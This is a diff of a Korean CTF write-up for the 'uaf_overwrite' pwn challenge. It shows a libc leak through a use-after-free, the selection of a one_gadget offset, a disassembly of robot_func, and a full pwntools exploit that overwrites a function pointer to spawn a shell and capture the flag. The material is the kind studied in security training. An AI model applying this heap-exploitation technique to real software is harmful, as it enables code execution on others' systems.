@@ -384,17 +384,213 @@ pwndbg> p/x 0x7ffff7dcdca0 - 0x7ffff79e2000
 $1 = 0x3ebca0
 ```
 
-이런 식으로 베이스 주소의 오프셋을 구했다.  
+이런 식으로 베이스 주소의 오프셋을 구했다.   
 
 
 <br>
 
 
-
 ![image](https://github.com/user-attachments/assets/054ecbec-7ac7-4a49-ab6a-fdeb583e96b8)
 
-그리고  해제한 청크에 다시 Z 단일 문자열을 넣었더니   
-0x7ffff7dcdca0 → 0x7ffff7dc0a5a 로 변했다.   
+그리고  해제한 청크에 다시 Z 단일 문자열을 넣었더니    
+0x7ffff7dcdca0 → 0x7ffff7dc0a5a 로 변했다.    
+
+그럼 여기까지 했을 때, `fd`를 가져올 수 있는 코드를 작성해보자.   
+
+<br> 
+
+**익스플로잇 코드** (`fd` 가져오기)   
+
+```python
+from pwn import *
+
+p=process('./uaf_overwrite')
+libc=ELF('./libc-2.27.so')
+
+p.sendlineafter(b'> ', b'3')
+p.sendlineafter(b'Size: ', b'1280')
+p.sendlineafter(b'Data: ', b'AAAA')
+p.sendlineafter(b'idx: ', b'9')
+
+p.sendlineafter(b'> ', b'3')
+p.sendlineafter(b'Size: ', b'1280')
+p.sendlineafter(b'Data: ', b'AAAA')
+p.sendlineafter(b'idx: ', b'0')
+
+p.sendlineafter(b'> ', b'3')
+p.sendlineafter(b'Size: ', b'1280')
+p.sendafter(b'Data: ', b'B')
+
+p.recvuntil(b'Data: ')
+libc_leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
+
+# libc_offset= 0x3ebca0
+libc_base = libc_leak - 0x3ebc42
+print(hex(libc_base))
+```
+
+`sendline`이 아니라 `send`를 통해서 보내므로 개행 문자없이 `0x7ffff7dcdc--` 가 나올 것이고,    
+`B`에 해당하는 `0x42`를 `0x3ebca0`에 넣어서 `0x3ebc42`를 빼주면 `libc_base`가 나온다.   
+
+![image (18)](https://github.com/user-attachments/assets/232b5b1f-a5b1-4a8c-b842-6e302e17fa72)
 
 
-libc base랑 offset은 구햇는데 가젯쓰는게아닌듯
+이렇게 `0x~~000` 형태의 베이스 주소를 얻었다. (리눅스 페이지 크기 **=** `0x1000` 바이트)   
+
+여기까지 나가고나니 ROP 체인을 굳이 짜줄 필요가 없다는 것을 알았다.  
+libc 버전도 정확하게 알고있고, case 2번에서는 재할당에서의 취약점을 통해 case 1번에 미리 입력해둔 주소로 옮길 수 있으니 그냥 원가젯을 먼저 찾아보기로 했다.  
+
+그럼 이제 원가젯을 찾아보자  
+
+<br>
+
+![image](https://github.com/user-attachments/assets/2277424e-2d47-4235-8656-d4ef0b3d709f)
+
+
+<br>
+
+```bash
+constraints:
+  rcx == NULL
+
+0x4f432 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  [rsp+0x40] == NULL
+
+0x10a41c        execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+```
+
+이렇게 원가젯들을 볼 수 있고,    
+
+`robot_func`를 보면서 원가젯을 사용할 수 있을지 판단해보자.   
+
+```nasm
+pwndbg> disass robot_func
+Dump of assembler code for function robot_func:
+   0x00005555554009f2 <+0>:     push   rbp
+   0x00005555554009f3 <+1>:     mov    rbp,rsp
+   0x00005555554009f6 <+4>:     mov    edi,0x20
+   0x00005555554009fb <+9>:     call   0x5555554007b0 <malloc@plt>
+   0x0000555555400a00 <+14>:    mov    QWORD PTR [rip+0x201649],rax        # 0x555555602050 <robot>
+   0x0000555555400a07 <+21>:    mov    rax,QWORD PTR [rip+0x201642]        # 0x555555602050 <robot>
+   0x0000555555400a0e <+28>:    mov    DWORD PTR [rax],0x6f626f52
+   0x0000555555400a14 <+34>:    mov    WORD PTR [rax+0x4],0x74
+   0x0000555555400a1a <+40>:    lea    rdi,[rip+0x3ce]        # 0x555555400def
+   0x0000555555400a21 <+47>:    mov    eax,0x0
+   0x0000555555400a26 <+52>:    call   0x555555400790 <printf@plt>
+   0x0000555555400a2b <+57>:    mov    rax,QWORD PTR [rip+0x20161e]        # 0x555555602050 <robot>
+   0x0000555555400a32 <+64>:    add    rax,0x10
+   0x0000555555400a36 <+68>:    mov    rsi,rax
+   0x0000555555400a39 <+71>:    lea    rdi,[rip+0x39c]        # 0x555555400ddc
+   0x0000555555400a40 <+78>:    mov    eax,0x0
+   0x0000555555400a45 <+83>:    call   0x5555554007d0 <__isoc99_scanf@plt>
+   0x0000555555400a4a <+88>:    mov    rax,QWORD PTR [rip+0x2015ff]        # 0x555555602050 <robot>
+   0x0000555555400a51 <+95>:    mov    rax,QWORD PTR [rax+0x18]
+   0x0000555555400a55 <+99>:    test   rax,rax
+   0x0000555555400a58 <+102>:   je     0x555555400a6e <robot_func+124>
+   0x0000555555400a5a <+104>:   mov    rax,QWORD PTR [rip+0x2015ef]        # 0x555555602050 <robot>
+   0x0000555555400a61 <+111>:   mov    rdx,QWORD PTR [rax+0x18]
+   0x0000555555400a65 <+115>:   mov    eax,0x0
+   0x0000555555400a6a <+120>:   call   rdx
+   0x0000555555400a6c <+122>:   jmp    0x555555400a80 <robot_func+142>
+   0x0000555555400a6e <+124>:   mov    rax,QWORD PTR [rip+0x2015db]        # 0x555555602050 <robot>
+   0x0000555555400a75 <+131>:   lea    rdx,[rip+0xfffffffffffffe7e]        # 0x5555554008fa <print_name>
+   0x0000555555400a7c <+138>:   mov    QWORD PTR [rax+0x18],rdx
+   0x0000555555400a80 <+142>:   mov    rax,QWORD PTR [rip+0x2015c9]        # 0x555555602050 <robot>
+   0x0000555555400a87 <+149>:   mov    rdx,QWORD PTR [rax+0x18]
+   0x0000555555400a8b <+153>:   mov    rax,QWORD PTR [rip+0x2015be]        # 0x555555602050 <robot>
+   0x0000555555400a92 <+160>:   mov    rdi,rax
+   0x0000555555400a95 <+163>:   mov    eax,0x0
+   0x0000555555400a9a <+168>:   call   rdx
+   0x0000555555400a9c <+170>:   mov    rax,QWORD PTR [rip+0x2015ad]        # 0x555555602050 <robot>
+   0x0000555555400aa3 <+177>:   mov    rdi,rax
+   0x0000555555400aa6 <+180>:   call   0x555555400760 <free@plt>
+   0x0000555555400aab <+185>:   nop
+   0x0000555555400aac <+186>:   pop    rbp
+   0x0000555555400aad <+187>:   ret
+```
+
+
+이 코드에서 `robot->fptr();` 를 실행시킬 수 있는 부분을 찾아보면  
+
+- `0x0000555555400a6a <+120>:   call   rdx`
+
+이 위치이므로 이곳에 브레이크를 걸고, case 1 인 human 함수에서 임의의 두 값을 넣어준 뒤   
+`rcx`, `rsp+0x40`, `rsp+0x70` 세 곳에서 어떤 값을 가지는지 확인해보자.  
+
+
+<br>
+
+![image](https://github.com/user-attachments/assets/27b5b308-07fb-446b-931a-5e20235e11a0)
+
+
+
+- `rcx` → `0x10`
+- `rsp+0x40` → `0x7fffffffe5d0: 0x0000000100000000`
+- `rsp+0x70` → `0x7fffffffe600: 0x0000000000000000`
+
+이렇게 `rsp+0x70`일 때 조건을 만족한 것을 알아냈다.    
+
+`one_gadget` = `libc_base` + `0x10a41c` 라 두고 코드를 마저 짜보자.  
+
+<br>
+
+**최종 익스플로잇 코드**  
+
+```python
+from pwn import *
+
+p = process('./uaf_overwrite', env={"LD_PRELOAD":"./libc-2.27.so"})
+libc=ELF('./libc-2.27.so')
+
+p.sendlineafter(b'> ', b'3')
+p.sendlineafter(b'Size: ', b'1280')
+p.sendlineafter(b'Data: ', b'AAAA')
+p.sendlineafter(b'idx: ', b'9')
+
+p.sendlineafter(b'> ', b'3')
+p.sendlineafter(b'Size: ', b'1280')
+p.sendlineafter(b'Data: ', b'AAAA')
+p.sendlineafter(b'idx: ', b'0')
+
+p.sendlineafter(b'> ', b'3')
+p.sendlineafter(b'Size: ', b'1280')
+p.sendafter(b'Data: ', b'B')
+
+p.recvuntil(b'Data: ')
+libc_leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
+
+# libc_offset= 0x3ebca0
+libc_base = libc_leak - 0x3ebc42
+print(hex(libc_base))
+p.sendlineafter(b'idx: ', b'9')
+
+one_gadget = libc_base + 0x10a41c
+
+p.sendlineafter(b'> ', b'1')
+p.sendlineafter(b'Weight: ', b'1')
+p.sendlineafter(b'Age: ', str(one_gadget).encode())
+
+p.sendlineafter(b'> ', b'2')
+p.sendlineafter(b'Weight: ', b'1')
+
+p.interactive()
+```
+
+이렇게 코드를 완성했다. 이걸 실행시켜보면  
+
+<br>
+
+![image](https://github.com/user-attachments/assets/4504c5e3-2b75-4967-8285-947adc83d457)
+
+<br>
+
+정답이 잘 나온다. 이제 서버에 직접 날려보면,  
+
+<br>
+
+![image](https://github.com/user-attachments/assets/82402533-850f-4b15-b2e3-a03c971a762f)
+
+성공적으로 플래그를 얻어냈다.  
